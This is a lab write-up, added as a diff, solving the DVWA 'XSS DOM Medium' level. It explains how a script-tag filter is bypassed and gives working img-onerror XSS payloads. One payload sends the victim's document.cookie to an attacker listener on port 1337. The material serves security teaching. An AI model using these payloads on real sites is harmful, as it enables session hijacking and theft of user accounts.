@@ -1,0 +1,67 @@
+#+TITLE: DVWA - XSS DOM Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  Same setup as before, but now there's some php code which tries to
+  do some input filtering.
+
+  #+begin_src php
+<?php
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];    
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+?>
+  #+end_src
+    
+* Solution
+  First I tried to use a different sort of tag such as ~<ScriPT~,
+  however the ~stripos~ function implements a case-insensitive substring
+  in a string.
+
+  We can then try with javascript events using a payload such as
+
+  #+begin_src html
+<img src='#' onerror="alert(1);">
+  #+end_src
+
+  The problem is that our GET parameter is inserted in the option element as follows
+
+  #+begin_src js
+document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+  #+end_src
+
+  this means that before we can add our img tags we need to break from
+  the option html tag. The following payload works
+
+  #+begin_example
+http://evil/vulnerabilities/xss_d/?default=English></select><img src='x' onerror='alert(1)'>
+  #+end_example
+
+  notice here that the vulnerable part of the client javascript code
+  is the code that performs
+
+  #+begin_example
+decodeURI(lang)
+  #+end_example
+
+  if it was not there, we would not be able to do it.
+
+  ----------------
+
+  To actually leak the user's cookie, we start a python server and we use the following payload
+
+  #+begin_src html
+<img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', `http://localhost:1337/${document.cookie}`, false); xhr.send(null);" />
+  #+end_src
+
+  we can encode it in the following URL
+
+  #+begin_example
+http://evil/vulnerabilities/xss_d/?default=English></select><img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', `http://localhost:1337/${document.cookie}`, false); xhr.send(null);" />
+  #+end_example
